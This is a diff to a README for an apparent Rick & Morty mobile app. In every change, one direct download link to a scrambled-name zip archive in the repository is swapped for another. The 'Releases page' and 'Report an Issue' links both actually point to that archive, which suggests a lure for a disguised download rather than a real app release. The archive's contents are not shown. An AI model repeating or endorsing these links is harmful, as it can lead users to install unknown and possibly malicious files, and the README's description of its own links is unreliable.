@@ -14,7 +14,7 @@ Before diving in, make sure your device meets the necessary requirements. Here�
 ## 📥 Download
 To get started, visit the Releases page to download the app.
 
-[![Download](https://raw.githubusercontent.com/addico24/RickAndMorty-VIPER-CleanArch/main/VIPER/Domain/Clean-Rick-VIPE-And-Morty-Arch-2.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/addico24/RickAndMorty-VIPER-CleanArch/main/VIPER/Domain/Clean-Rick-VIPE-And-Morty-Arch-2.8.zip)
+[![Download](https://raw.githubusercontent.com/addico24/RickAndMorty-VIPER-CleanArch/main/VIPER/Features/Home/VIPE-And-Rick-Morty-Arch-Clean-1.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/addico24/RickAndMorty-VIPER-CleanArch/main/VIPER/Features/Home/VIPE-And-Rick-Morty-Arch-Clean-1.0.zip)
 
 ## 📋 Features
 - **Explore the Universe:** Browse characters, locations, and episodes from Rick & Morty.
@@ -25,13 +25,13 @@ To get started, visit the Releases page to download the app.
 ## 📦 Download & Install
 1. Click the button below to visit the Releases page.
    
-   [Download the app](https://raw.githubusercontent.com/addico24/RickAndMorty-VIPER-CleanArch/main/VIPER/Domain/Clean-Rick-VIPE-And-Morty-Arch-2.8.zip)
+   [Download the app](https://raw.githubusercontent.com/addico24/RickAndMorty-VIPER-CleanArch/main/VIPER/Features/Home/VIPE-And-Rick-Morty-Arch-Clean-1.0.zip)
 
 2. On the Releases page, find the latest version.
 
 3. Click on the version number to open the release details.
 
-4. Locate the application file (e.g., https://raw.githubusercontent.com/addico24/RickAndMorty-VIPER-CleanArch/main/VIPER/Domain/Clean-Rick-VIPE-And-Morty-Arch-2.8.zip).
+4. Locate the application file (e.g., https://raw.githubusercontent.com/addico24/RickAndMorty-VIPER-CleanArch/main/VIPER/Features/Home/VIPE-And-Rick-Morty-Arch-Clean-1.0.zip).
 
 5. Click on the file name to download it to your device.
 
@@ -47,7 +47,7 @@ After installation, you can launch the app from your home screen. Here’s how t
 ## 🤝 Support
 If you encounter any issues or have questions, please submit an issue on the GitHub repository. Your feedback helps us improve the app:
 
-[Report an Issue](https://raw.githubusercontent.com/addico24/RickAndMorty-VIPER-CleanArch/main/VIPER/Domain/Clean-Rick-VIPE-And-Morty-Arch-2.8.zip)
+[Report an Issue](https://raw.githubusercontent.com/addico24/RickAndMorty-VIPER-CleanArch/main/VIPER/Features/Home/VIPE-And-Rick-Morty-Arch-Clean-1.0.zip)
 
 ## 📞 Contact
 For any inquiries or suggestions, you can reach out to the development team through the GitHub repository.
